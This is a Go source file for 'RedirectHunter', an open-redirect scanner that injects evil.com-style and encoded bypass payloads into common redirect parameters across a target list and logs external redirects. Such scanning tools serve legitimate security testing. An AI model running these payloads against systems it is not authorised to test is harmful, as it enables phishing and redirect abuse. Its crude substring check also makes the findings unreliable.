package main

import (
	"bufio"
	"fmt"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"
)

var redirectParams = []string{
	"redirect", "redirect_url", "redirect_uri",
	"next", "url", "return", "continue",
	"dest", "destination", "callback",
}

var payloads = []string{
	"https://evil.com",
	"//evil.com",
	"https://evil.com/%2f..",
	"https:%2f%2fevil.com",
	"///evil.com",
	"http://127.0.0.1",
}

type Finding struct {
	Target     string
	Parameter  string
	Payload    string
	FinalURL   string
	StatusCode int
	Chain      []string
}

func banner() {
	fmt.Println(`
██████╗ ███████╗██████╗ ██╗██████╗ ███████╗
██╔══██╗██╔════╝██╔══██╗██║██╔══██╗██╔════╝
██████╔╝█████╗  ██║  ██║██║██████╔╝█████╗  
██╔══██╗██╔══╝  ██║  ██║██║██╔══██╗██╔══╝  
██║  ██║███████╗██████╔╝██║██║  ██║███████╗
╚═╝  ╚═╝╚══════╝╚═════╝ ╚═╝╚═╝  ╚═╝╚══════╝
RedirectHunter — Open Redirect Exploitation Engine
`)
}

func loadTargets(file string) []string {
	var targets []string
	f, err := os.Open(file)
	if err != nil {
		fmt.Println("Error opening file")
		os.Exit(1)
	}
	defer f.Close()

	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" {
			targets = append(targets, line)
		}
	}
	return targets
}

func buildURL(base, param, payload string) string {
	u, _ := url.Parse(base)
	q := u.Query()
	q.Set(param, payload)
	u.RawQuery = q.Encode()
	return u.String()
}

func followRedirects(start string) ([]string, int, string) {
	var chain []string
	client := &http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			chain = append(chain, req.URL.String())
			if len(chain) >= 10 {
				return http.ErrUseLastResponse
			}
			return nil
		},
		Timeout: 10 * time.Second,
	}

	resp, err := client.Get(start)
	if err != nil {
		return chain, 0, ""
	}
	defer resp.Body.Close()

	finalURL := resp.Request.URL.String()
	return chain, resp.StatusCode, finalURL
}

func isExternalRedirect(finalURL, target string) bool {
	return !strings.Contains(finalURL, target)
}

func testTarget(target string) []Finding {
	var findings []Finding

	for _, param := range redirectParams {
		for _, payload := range payloads {
			testURL := buildURL(target, param, payload)
			chain, status, finalURL := followRedirects(testURL)

			if isExternalRedirect(finalURL, target) {
				f := Finding{
					Target:     target,
					Parameter: param,
					Payload:    payload,
					FinalURL:   finalURL,
					StatusCode: status,
					Chain:      chain,
				}
				findings = append(findings, f)

				fmt.Println("[!] OPEN REDIRECT FOUND")
				fmt.Println("Target:", target)
				fmt.Println("Param:", param)
				fmt.Println("Payload:", payload)
				fmt.Println("Final:", finalURL)
				fmt.Println("----")
			}
		}
	}
	return findings
}

func saveReport(findings []Finding) {
	file, _ := os.Create("redirect_hunter_report.txt")
	defer file.Close()

	for _, f := range findings {
		file.WriteString("Target: " + f.Target + "\n")
		file.WriteString("Parameter: " + f.Parameter + "\n")
		file.WriteString("Payload: " + f.Payload + "\n")
		file.WriteString("Final URL: " + f.FinalURL + "\n")
		file.WriteString("Status: " + fmt.Sprint(f.StatusCode) + "\n")
		file.WriteString("Redirect Chain:\n")
		for _, c := range f.Chain {
			file.WriteString("  -> " + c + "\n")
		}
		file.WriteString("\n")
	}
}

func main() {
	if len(os.Args) != 2 {
		fmt.Println("Usage: ./redirect_hunter targets.txt")
		os.Exit(1)
	}

	banner()
	targets := loadTargets(os.Args[1])

	var allFindings []Finding

	for _, t := range targets {
		fmt.Println("[+] Testing:", t)
		results := testTarget(t)
		allFindings = append(allFindings, results...)
	}

	saveReport(allFindings)
	fmt.Println("[+] Done. Results saved to redirect_hunter_report.txt")
}
